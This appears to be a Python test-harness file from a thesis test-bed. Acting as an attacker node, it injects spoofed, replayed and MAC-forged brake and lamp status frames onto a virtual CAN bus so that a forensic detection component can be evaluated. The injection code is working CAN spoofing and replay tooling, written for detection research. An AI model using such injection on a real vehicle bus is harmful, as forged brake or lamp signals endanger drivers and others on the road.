# Event injector — NEW FILE

#**Path:** `event_injector/app.py` (new folder, new file)

#The attacker node for the test-bed. Transmits on the production bus
#(`vcan0`); the forensic component sees the mirrored copy on `vcan1` and
#should detect each attack via a distinct anomaly type.

#| Attack mode  | What it does                                          | Expected detection                       |
#|--------------|-------------------------------------------------------|------------------------------------------|
#| `spoof`      | Forged status frame with random MAC                   | `MAC_VERIFY_FAILED`                      |
#| `replay`     | Captures a real frame, re-sends it                    | `REPLAY_DETECTED` (stale freshness)      |
#| `spec`       | Lamp-on frame without preceding brake (no key)        | `MAC_VERIFY_FAILED` first                |
#| `spec --have-key` | Same, but attacker has the SecOC key             | `SPEC_VIOLATION_LAMP_WITHOUT_BRAKE`      |
#| `drop`       | Prints the mirror-gateway command (not done by injector) | `DROP_DETECTED` via causality timeout |

#The `--have-key` flag for `spec` simulates a **compromised endpoint**:
#the attacker can forge valid-MAC frames, so MAC verification alone
#cannot catch the attack — the cross-ECU specification check does.
#This is the scenario your thesis uses to argue that MAC ≠ forensics.


"""
event_injector/app.py
---------------------
Attacker node for the ADF test-bed (inline-SecOC profile).

Generates the bus-level events that the forensic component is expected
to detect:

  spoof:   send a forged status frame with a random/invalid MAC.
           expected detection: MAC_VERIFY_FAILED.
  replay:  observe a real authenticated frame and re-send it later.
           expected detection: REPLAY_DETECTED (stale freshness).
  spec:    send a lamp-on frame when no brake is active. Without the
           key the MAC verify fails first; with --have-key (compromised
           endpoint), the MAC is valid and the cross-ECU causality
           check catches it as SPEC_VIOLATION_LAMP_WITHOUT_BRAKE.
  drop:    NOT performed here. Frames already broadcast on vcan0 cannot
           be un-sent; drops are emulated by running can_bus_sim in
           gateway mode with --suppress. This sub-command just prints
           the command to run.

Usage examples:
  python event_injector/app.py --attack spoof  --target brake --count 5
  python event_injector/app.py --attack replay --replay-id 0x110 --count 3
  python event_injector/app.py --attack spec   --target light --have-key
  python event_injector/app.py --attack drop

This script is part of the TEST HARNESS, not the proposed technique.
"""

import argparse
import os
import random
import time
import can

import secoc_lite as secoc

PRODUCTION_BUS = "vcan0"
INTERFACE      = "socketcan"

BRAKE_STATUS_ID          = 0x110
EXTERIOR_LIGHT_STATUS_ID = 0x120


def random_mac_bytes(n=secoc.MAC_TRUNCATED_BYTES):
    return list(os.urandom(n))


def make_secured_frame_with_mac(data_id, payload, freshness, mac_bytes):
    """Assemble an 8-byte 'secured' frame using an arbitrary MAC value
    (used by spoof attacks where we do NOT have the key)."""
    if len(payload) != secoc.PAYLOAD_BYTES:
        raise ValueError(f"payload must be {secoc.PAYLOAD_BYTES} bytes")
    return list(payload) + [freshness & 0xFF] + list(mac_bytes)


# =========================================================
# Spoof
# =========================================================
def attack_spoof(bus, target_id, count, interval):
    """Send forged status frames with a RANDOM (invalid) truncated MAC."""
    if target_id == BRAKE_STATUS_ID:
        payload = bytes([1, 80, 1, 0])   # brake_active, force=80, enabled, faults=0
        label = "fake brake-active"
    elif target_id == EXTERIOR_LIGHT_STATUS_ID:
        payload = bytes([1, 1, 0, 0])    # light_active, enabled, faults=0, last=0
        label = "fake lamp-on"
    else:
        raise ValueError("spoof target must be 0x110 or 0x120")

    print(f"[injector] SPOOF: sending {count} '{label}' frames on "
          f"0x{target_id:X} with RANDOM MAC. "
          f"Expect MAC_VERIFY_FAILED in the forensic log.")

    for i in range(count):
        freshness = random.randint(0, 255)
        mac = random_mac_bytes()
        frame = make_secured_frame_with_mac(target_id, payload, freshness, mac)
        msg = can.Message(arbitration_id=target_id, data=frame,
                          is_extended_id=False)
        bus.send(msg)
        print(f"[injector] sent spoof {i+1}/{count}: frame={frame}")
        time.sleep(interval)


# =========================================================
# Replay
# =========================================================
def attack_replay(bus, target_id, count, interval, capture_timeout):
    """Capture one real authenticated frame on `target_id`, then re-send
    it `count` times. The MAC is valid but the freshness is stale, so
    the forensic component should flag REPLAY_DETECTED."""
    print(f"[injector] REPLAY: listening on 0x{target_id:X} to capture one "
          f"authentic frame (timeout={capture_timeout}s)...")

    listen_bus = can.interface.Bus(interface=INTERFACE,
                                   channel=PRODUCTION_BUS)
    captured = None
    deadline = time.time() + capture_timeout
    try:
        while time.time() < deadline:
            msg = listen_bus.recv(timeout=0.5)
            if (msg is not None
                    and msg.arbitration_id == target_id
                    and len(msg.data) == secoc.SECURED_FRAME_BYTES):
                captured = bytes(msg.data)
                print(f"[injector] captured frame on 0x{target_id:X}: "
                      f"{list(captured)}")
                break
    finally:
        listen_bus.shutdown()

    if captured is None:
        print("[injector] REPLAY: no authentic frame captured in time. Aborting.")
        return

    print(f"[injector] REPLAY: re-sending captured frame {count} times. "
          f"Each replay carries a stale freshness counter and should be "
          f"flagged REPLAY_DETECTED.")
    for i in range(count):
        time.sleep(interval)
        msg = can.Message(arbitration_id=target_id,
                          data=list(captured),
                          is_extended_id=False)
        bus.send(msg)
        print(f"[injector] sent replay {i+1}/{count}")


# =========================================================
# Spec violation (lamp without brake)
# =========================================================
def attack_spec(bus, target, have_key, count, interval):
    """Send lamp-on frames with no preceding brake.

    Without --have-key: random MAC, so the forensic component rejects
    each frame as MAC_VERIFY_FAILED.

    With --have-key: forge a VALID MAC (attacker is a compromised
    endpoint that holds the SecOC key). The MAC verifies fine, but the
    cross-ECU specification check catches the violation as
    SPEC_VIOLATION_LAMP_WITHOUT_BRAKE.
    """
    if target != "light":
        raise ValueError("spec target supported: 'light'")

    data_id = EXTERIOR_LIGHT_STATUS_ID
    payload = bytes([1, 1, 0, 0])        # light_active=1, enabled=1

    expected = ("SPEC_VIOLATION_LAMP_WITHOUT_BRAKE" if have_key
                else "MAC_VERIFY_FAILED")
    print(f"[injector] SPEC: sending {count} lamp-on frames with no brake "
          f"context. have_key={have_key}. Expect {expected}.")

    fresh = random.randint(0, 255)
    for i in range(count):
        if have_key:
            secured = secoc.build_secured_frame(data_id, fresh, payload)
        else:
            secured = make_secured_frame_with_mac(
                data_id, payload, fresh, random_mac_bytes()
            )
        msg = can.Message(arbitration_id=data_id, data=secured,
                          is_extended_id=False)
        bus.send(msg)
        print(f"[injector] sent spec-violation frame {i+1}/{count}: {secured}")
        fresh = (fresh + 1) % 256
        time.sleep(interval)


# =========================================================
# Drop  (informational)
# =========================================================
def attack_drop():
    print("[injector] DROP: a frame already broadcast on vcan0 cannot be")
    print("           un-sent. Drops are emulated at the mirror, not by")
    print("           this script. Run the mirror in gateway mode:")
    print("             python can_bus_sim/app.py --mode gateway "
          "--suppress 0x110")
    print("           ... while the brake stimulus is running. The forensic")
    print("           component should report DROP_DETECTED via the")
    print("           brake->lamp causality timeout.")


# =========================================================
# Main
# =========================================================
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--attack", required=True,
                    choices=["spoof", "replay", "spec", "drop"])
    ap.add_argument("--target", default="brake",
                    choices=["brake", "light"],
                    help="which status frame to attack (spoof/spec)")
    ap.add_argument("--replay-id", default="0x110",
                    help="CAN id to capture for replay (default 0x110)")
    ap.add_argument("--have-key", action="store_true",
                    help="for 'spec': pretend the attacker holds the "
                         "SecOC key (compromised endpoint scenario)")
    ap.add_argument("--count", type=int, default=5,
                    help="number of injected frames")
    ap.add_argument("--interval", type=float, default=0.2,
                    help="seconds between injected frames")
    ap.add_argument("--capture-timeout", type=float, default=10.0,
                    help="how long to wait when capturing for replay")
    args = ap.parse_args()

    if args.attack == "drop":
        attack_drop()
        return

    bus = can.interface.Bus(interface=INTERFACE, channel=PRODUCTION_BUS)
    target_id = (BRAKE_STATUS_ID if args.target == "brake"
                 else EXTERIOR_LIGHT_STATUS_ID)
    replay_id = int(args.replay_id, 0)

    try:
        if args.attack == "spoof":
            attack_spoof(bus, target_id, args.count, args.interval)
        elif args.attack == "replay":
            attack_replay(bus, replay_id, args.count, args.interval,
                          args.capture_timeout)
        elif args.attack == "spec":
            attack_spec(bus, args.target, args.have_key,
                        args.count, args.interval)
    except KeyboardInterrupt:
        print("\n[injector] stopped.")
    finally:
        bus.shutdown()


if __name__ == "__main__":
    main()

